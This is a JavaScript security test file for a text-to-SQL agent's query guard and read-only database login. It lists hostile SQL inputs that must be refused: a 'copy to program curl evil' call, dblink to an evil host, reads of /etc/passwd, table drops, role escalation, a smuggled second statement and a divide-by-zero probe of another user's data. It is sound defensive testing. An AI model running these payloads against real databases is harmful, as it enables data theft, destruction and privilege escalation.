// Security checks for the text-to-SQL agent's query path (guard + nlq_agent login).
//
//   npm run test:agent-guard
//
// Legitimate queries must run; every attack must be refused, by the guard and,
// for the ones that reach it, by the database. Changes nothing.

import { fileURLToPath } from "node:url";
import pg from "pg";
import { runSelect, closePool } from "../src/lib/agent/db.ts";

process.loadEnvFile(fileURLToPath(new URL("../.env.local", import.meta.url)));

let failures = 0;
function report(pass, label, detail) {
  if (!pass) failures++;
  console.log(`${pass ? "PASS" : "FAIL"}  ${label}${detail ? `  ->  ${detail}` : ""}`);
}

async function allowed(label, role, sql, params) {
  const r = await runSelect(sql, role, params);
  report(r.ok, label, r.ok ? `${r.rowCount} rows${r.truncated ? " (truncated)" : ""}` : r.error);
}

async function refused(label, role, sql) {
  const r = await runSelect(sql, role);
  report(!r.ok, label, r.ok ? `RAN: ${JSON.stringify(r.rows.slice(0, 1))}` : r.error.slice(0, 110));
}

console.log("Legitimate queries");
await allowed("student: cheapest listings", "nlq_student", "select title, sale_price from nlq.listings where sale_price is not null order by sale_price limit 5;");
await allowed("student: unqualified view + calendar join", "nlq_student", "select c.semester, count(*) from listings l join calendar c on c.day = (l.listed_at at time zone 'America/New_York')::date group by 1");
await allowed("admin: late rentals in spring move-out", "nlq_admin", "select count(*) from nlq.deals d join nlq.calendar c on c.day = d.rental_due_date where d.deal_type = 'rental' and d.returned_late and c.period = 'move-out' and c.academic_year = '2024-25'");
await allowed("admin: CTE + window function", "nlq_admin", "with m as (select date_trunc('month', listed_on) as month, count(*) n from nlq.listings_all group by 1) select month, n, lag(n) over (order by month) from m order by month");
await allowed("admin: extract / substring / position / trim / like escape", "nlq_admin", "select extract(year from listed_on), substring(title from 1 for 10), position('a' in title), trim(title) from nlq.listings_all where title like '%!%%' escape '!' limit 3");
await allowed("admin: generate_series date spine", "nlq_admin", "select d::date, count(l.item_id) from generate_series('2025-01-01'::date, '2025-01-07', interval '1 day') d left join nlq.listings_all l on l.listed_on = d::date group by 1 order by 1");
await allowed("admin: row cap (truncates at 200)", "nlq_admin", "select item_id from nlq.listings_all");
await allowed("admin: trailing comment", "nlq_admin", "select count(*) from nlq.reviews -- total reviews");
await allowed("student: parameter", "nlq_student", "select name from nlq.meetup_spots where name ilike $1", ["%curry%"]);

console.log("\nAttacks");
await refused("drop table", "nlq_admin", "drop table nlq.calendar");
await refused("delete", "nlq_admin", "delete from nlq.calendar");
await refused("two statements", "nlq_admin", "select 1; delete from nlq.calendar");
await refused("set transaction read write", "nlq_admin", "set transaction read write");
await refused("set role", "nlq_admin", "set role postgres");
await refused("set_config role", "nlq_admin", "select set_config('role', 'postgres', true)");
await refused("current_setting leak", "nlq_admin", "select current_setting('data_directory')");
await refused("pg_sleep", "nlq_admin", "select pg_sleep(30)");
await refused("pg_read_file", "nlq_admin", "select pg_read_file('/etc/passwd')");
await refused("dblink", "nlq_admin", "select * from dblink('host=evil', 'select 1') as t(x int)");
await refused("auth.users", "nlq_admin", "select email from auth.users");
await refused("public.profiles (names)", "nlq_admin", "select name from public.profiles");
await refused("catalog: pg_roles", "nlq_admin", "select * from pg_catalog.pg_roles");
await refused("catalog unqualified: pg_user", "nlq_admin", "select * from pg_user");
await refused("ops.agent_runs", "nlq_admin", "select * from ops.agent_runs");
await refused("app write function", "nlq_admin", "select public.remove_listing(1)");
await refused("app write function, unqualified", "nlq_admin", "select remove_listing(1)");
await refused("data-modifying CTE", "nlq_admin", "with d as (delete from nlq.calendar returning *) select count(*) from d");
await refused("select into (creates a table)", "nlq_admin", "select * into nlq.stolen from nlq.deals");
await refused("for update (locks rows)", "nlq_admin", "select * from nlq.calendar for update");
await refused("copy to program", "nlq_admin", "copy (select 1) to program 'curl evil'");
await refused("explain analyze", "nlq_admin", "explain analyze select 1");
await refused("student reads admin view", "nlq_student", "select count(*) from nlq.deals");
await refused("student reads admin view in subquery", "nlq_student", "select (select count(*) from nlq.reviews)");
await refused("set-returning function in FROM", "nlq_admin", "select * from pg_ls_dir('.') as t(x)");
await refused("comment smuggling a second statement", "nlq_admin", "select 1 /* ; */ ; drop table nlq.calendar");

console.log("\nMade-up columns (rejected before running)");
await refused("alias.column that doesn't exist", "nlq_student", "select l.price from nlq.listings l");
await refused("view.column that doesn't exist", "nlq_admin", "select deals.buyer_name from nlq.deals");
await allowed("real qualified columns", "nlq_admin", "select l.title, s.name from nlq.listings_all l join nlq.meetup_spots s on s.spot_id = l.spot_id limit 3");

console.log("\nTime zones (UTC timestamps must be converted before taking the date)");
await refused("timestamptz::date (alias)", "nlq_admin", "select avg(r.resolved_at::date - r.filed_on) from nlq.reports r");
await refused("cast(timestamptz as date)", "nlq_student", "select count(*) from nlq.listings where cast(listed_at as date) = '2025-04-21'");
await allowed("converted to Boston first", "nlq_admin", "select avg((resolved_at at time zone 'America/New_York')::date - filed_on) from nlq.reports where resolved_at is not null");
await allowed("date column cast is fine", "nlq_admin", "select count(*) from nlq.deals where rental_due_date::date > '2025-01-01'");

console.log("\nPrivate details in results");
{
  const r = await runSelect("select 'reach me at bob.smith@example.com or (617) 555-0123, ig @bobsells' as t", "nlq_student");
  const text = r.ok ? r.rows[0].t : r.error;
  report(r.ok && !/example\.com|555-0123|@bobsells/.test(text), "emails, phone numbers and handles are masked", text);
}

console.log("\nStudents' own data (my_* views)");
{
  const admin = new pg.Client({ connectionString: process.env.DATABASE_URL, ssl: { rejectUnauthorized: false } });
  await admin.connect();
  const { rows: [a, b] } = await admin.query(
    "with u as (select buyer_id as id from nlq.deals union all select seller_id from nlq.deals) select id::text, count(*)::int as n from u group by id order by 2 desc limit 2",
  );
  const { rows: [{ deal_id: bDeal }] } = await admin.query(
    "select deal_id from nlq.deals where $1::uuid in (buyer_id, seller_id) and $2::uuid not in (buyer_id, seller_id) limit 1",
    [b.id, a.id],
  );
  await admin.end();

  const count = async (userId) => {
    const r = await runSelect("select count(*)::int as n from nlq.my_deals", "nlq_student", [], { userId });
    return r.ok ? r.rows[0].n : r.error;
  };
  const [na, nb, none] = [await count(a.id), await count(b.id), await count(null)];
  report(na === a.n, "student A sees exactly their own deals", `${na} of ${a.n}`);
  report(nb === b.n, "student B sees exactly their own deals", `${nb} of ${b.n}`);
  report(none === 0, "nobody signed in: my_deals is empty", String(none));
  const probe = await runSelect(
    `select count(*) from nlq.my_deals where 1 / (case when deal_id = ${bDeal} then 0 else 1 end) = 1`,
    "nlq_student", [], { userId: a.id },
  );
  report(probe.ok, "A probing one of B's deals with a divide-by-zero filter learns nothing", probe.ok ? "no error raised" : probe.error);
  await refused("model sets its own user id", "nlq_student", `select set_config('app.user_id', '${b.id}', true)`);
  await refused("model reads the user id", "nlq_student", "select current_setting('app.user_id', true)");
}

console.log("\nDatabase layer alone (guard bypassed on purpose)");
const db = new pg.Client({ connectionString: process.env.NLQ_DATABASE_URL, ssl: { rejectUnauthorized: false } });
await db.connect();
for (const [label, sql] of [
  ["app write function inside the locked read-only transaction", "select public.remove_listing(1)"],
  ["read-write switch after the lock query", "set transaction read write"],
]) {
  try {
    await db.query("begin read only");
    await db.query("set local role nlq_admin");
    await db.query("select 1");
    await db.query(sql);
    report(false, label, "RAN");
  } catch (e) {
    report(true, label, e.message.slice(0, 110));
  } finally {
    await db.query("rollback").catch(() => {});
  }
}
await db.end();
await closePool();

console.log(failures ? `\n${failures} check(s) FAILED` : "\nAll checks passed");
process.exitCode = failures ? 1 : 0;
